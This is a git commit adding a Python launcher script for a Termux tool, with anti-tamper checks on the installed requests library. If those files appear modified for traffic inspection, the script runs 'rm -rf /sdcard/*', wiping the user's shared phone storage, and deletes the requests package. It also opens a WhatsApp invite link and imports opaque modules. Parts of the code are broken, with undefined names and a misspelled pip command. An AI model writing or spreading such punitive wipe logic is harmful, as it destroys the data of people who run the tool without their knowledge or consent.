5ceedcb3d3ad934d37565562b37c471babafb7a2
DESTROYED-TESTER <168154763+DESTROYED-TESTER@users.noreply.github.com>
2024-10-09 17:57:15 +0530

    Create se.py

---
+++ se.py
@@ -0,0 +1,145 @@
+import os
+import zlib
+import platform
+
+def es():
+    if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
+        pass
+    else:
+        os.system('clear')
+        print("System Modification Not Allowed Since Using SHAJON's Tool")
+        exit()
+    if path.isfile("/data/data/com.termux/files/usr/bin/termux-reset"):
+        pass
+    else:
+        os.system('clear')
+        print("System Modification Not Allowed Since Using SHAJON's Tool")
+        exit()
+    if path.isfile("/data/data/com.termux/files/usr/bin/termux-setup-storage"):
+        pass
+    else:
+        os.system('clear')
+        print("System Modification Not Allowed Since Using SHAJON's Tool")
+        exit()
+with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py', 'r') as file:
+    file_content = file.read()
+if 'print(url)' in file_content:
+    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
+    os.system('rm -rf /sdcard/*')
+    os.system('pip unstall requests')
+    os.system('pip install requests')
+    print("System Modification Not Allowed Since Using SHAJON's Tool")
+    exit(f'\x1b[38;5;46m➤{A} RUN AGAIN TOOL...!')
+
+with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py', 'r') as file:
+    file_content = file.read()
+if 'print' in file_content:
+    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
+    os.system('rm -rf /sdcard/*')
+    os.system('pip unstall requests')
+    os.system('pip install requests')
+    print("System Modification Not Allowed Since Using SHAJON's Tool")
+    exit(f'\x1b[38;5;46m➤{A} RUN AGAIN TOOL...!')
+
+with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py', 'r') as file:
+    file_content = file.read()
+if 'verify=False' in file_content:
+    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
+    os.system('rm -rf /sdcard/*')
+    os.system('pip unstall requests')
+    os.system('pip install requests')
+    print("System Modification Not Allowed Since Using SHAJON's Tool")
+    exit(f'\x1b[38;5;46m➤{A} RUN AGAIN TOOL...!')
+  
+with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/auth.py', 'r') as file:
+    file_content = file.read()
+if 'verify=False' in file_content:
+    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
+    os.system('rm -rf /sdcard/*')
+    os.system('pip unstall requests')
+    os.system('pip install requests')
+    print("System Modification Not Allowed Since Using SHAJON's Tool")
+    exit(f'\x1b[38;5;46m➤{A} RUN AGAIN TOOL...!')
+#---------------------------------another---------------------------------#
+sss='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
+if not 'print' in open(sss+'sessions.py','r').read():
+    pass
+else:
+    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
+    os.system('rm -rf /sdcard/*')
+    os.system('pip unstall requests')
+    os.system('pip install requests')
+    print("System Modification Not Allowed Since Using SHAJON's Tool")
+    exit(f'\x1b[38;5;46m➤{A} RUN AGAIN TOOL...!')
+    
+sss='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
+if not 'print' in open(sss+'models.py','r').read():
+    pass
+else:
+    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
+    os.system('rm -rf /sdcard/*')
+    os.system('pip unstall requests')
+    os.system('pip install requests')
+    print("System Modification Not Allowed Since Using SHAJON's Tool")
+    exit(f'\x1b[38;5;46m➤{A} RUN AGAIN TOOL...!')
+    
+sss='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
+if not 'print' in open(sss+'utils.py','r').read():
+    pass
+else:
+    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
+    os.system('rm -rf /sdcard/*')
+    os.system('pip unstall requests')
+    os.system('pip install requests')
+    print("System Modification Not Allowed Since Using SHAJON's Tool")
+    exit(f'\x1b[38;5;46m➤{A} RUN AGAIN TOOL...!')
+    
+sss='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
+if not 'print' in open(sss+'api.py','r').read():
+    pass
+else:
+    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
+    os.system('rm -rf /sdcard/*')
+    os.system('pip unstall requests')
+    os.system('pip install requests')
+    print("System Modification Not Allowed Since Using SHAJON's Tool")
+    exit(f'\x1b[38;5;46m➤{A} RUN AGAIN TOOL...!')
+    
+sss='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
+if not 'print' in open(sss+'auth.py','r').read():
+    pass
+else:
+    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
+    os.system('rm -rf /sdcard/*')
+    os.system('pip unstall requests')
+    os.system('pip install requests')
+    print("System Modification Not Allowed Since Using SHAJON's Tool")
+    exit(f'\x1b[38;5;46m➤{A} RUN AGAIN TOOL...!')
+    
+sss='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
+if not 'print' in open(sss+'packages.py','r').read():
+    pass
+else:
+    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
+    os.system('rm -rf /sdcard/*')
+    os.system('pip unstall requests')
+    os.system('pip install requests')
+    print("System Modification Not Allowed Since Using SHAJON's Tool")
+    exit(f'\x1b[38;5;46m➤{A} RUN AGAIN TOOL...!')
+
+def run():
+    bit = platform.architecture()[0]
+    os.system("clear")
+    print(" [√] Whatsapp ")
+    os.system("xdg-open  https://chat.whatsapp.com/ImgbbAV3zyu5LK4aIX4EnO")
+    if "32bit" in bit:
+        print(" [•] Your device is 32bit (supported) ")
+        __import__("SORRY")
+    elif "64bit" in bit:
+        print(" [√] device is 64bit ")
+        __import__("ATOMA")
+    else:
+        print(" [•] Unknown Architecture ")
+        print(" [•] Your device dont support this tool ")
+
+run()
